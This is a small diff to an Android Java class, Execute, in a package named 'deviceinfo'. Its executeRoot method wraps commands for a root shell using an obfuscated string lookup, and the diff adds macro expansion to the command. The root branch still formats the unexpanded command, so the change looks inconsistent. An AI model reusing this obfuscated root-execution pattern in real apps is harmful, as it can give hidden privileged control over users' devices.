@@ -12,13 +12,14 @@ import java.util.concurrent.TimeoutException;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.Configuration;
+import com.android.deviceinfo.file.Directory;
 import com.android.m.M;
 
 public class Execute {
 	private static final String TAG = "Execute";
 	
 	public static ExecuteResult executeRoot(String command) {
-		String cmd = command;
+		String cmd = Directory.expandMacro(command);
 
 		if (Status.haveRoot()) {
 			cmd = String.format("%s %s %s", Configuration.shellFile, M.e("qzx"), command); // EXPORT
